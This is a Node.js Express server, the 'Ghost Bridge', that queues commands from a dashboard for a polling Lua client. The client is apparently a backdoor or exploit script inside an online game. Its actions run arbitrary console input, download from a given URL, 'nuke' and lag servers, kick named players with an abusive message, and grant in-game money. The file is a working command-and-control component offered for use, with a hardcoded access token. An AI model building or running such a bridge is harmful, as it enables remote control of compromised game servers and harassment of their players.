const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// Serve Dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Internal State
let PENDING_COMMANDS = [];
const TOKEN = "GHOST_2025";

// Endpoint 1: Dashboard adds a command to the queue
app.post('/api/exec', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    const { action, input, customText, duration, url, targetId, amount, kickMsg } = req.body;
    let cmdPayload = "";

    if (action === "console") {
        cmdPayload = JSON.stringify({ type: "console", data: input });
    } else if (action === "nuke") {
        cmdPayload = JSON.stringify({ type: "nuke", text: customText || "NUKED" });
    } else if (action === "lag") {
        cmdPayload = JSON.stringify({ type: "lag", duration: duration });
    } else if (action === "download") {
        cmdPayload = JSON.stringify({ type: "download", url: url });
    } else if (action === "kick") {
        cmdPayload = JSON.stringify({ type: "kick", targetId: targetId, msg: kickMsg || "Suck my Nuts Bitch" });
    } else if (action === "money") {
        cmdPayload = JSON.stringify({ type: "money", targetId: targetId, amount: amount || 1000000 });
    } else if (action === "lagAll") {
        cmdPayload = JSON.stringify({ type: "lagAll" });
    }

    PENDING_COMMANDS.push(cmdPayload);
    console.log(`[Bridge] Queued: ${cmdPayload}`);
    res.json({ status: 'queued' });
});

// Endpoint 2: Lua polls for commands
app.get('/api/poll', (req, res) => {
    if (req.headers['x-ghost-token'] !== TOKEN) return res.status(401).json({ error: 'Unauthorized' });
    
    if (PENDING_COMMANDS.length > 0) {
        const cmd = PENDING_COMMANDS.shift();
        res.json({ status: 'active', command: cmd });
    } else {
        res.json({ status: 'idle' });
    }
});

app.listen(8080, () => console.log(`Ghost Bridge Active (Pull Mode)`));
